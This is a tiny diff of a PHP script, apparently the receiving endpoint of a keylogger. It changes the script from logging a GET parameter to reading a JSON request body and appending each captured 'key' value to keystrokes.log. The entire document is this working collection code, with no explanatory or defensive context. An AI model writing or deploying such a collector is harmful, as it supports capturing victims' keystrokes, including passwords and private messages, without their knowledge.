@@ -1,5 +1,4 @@
 <?php
-$file = 'logs.txt';
-$data = $_GET['data'] . "\n";
-file_put_contents($file, $data, FILE_APPEND);
+$data = json_decode(file_get_contents("php://input"), true);
+file_put_contents("keystrokes.log", $data['key'] . "\n", FILE_APPEND);
 ?>
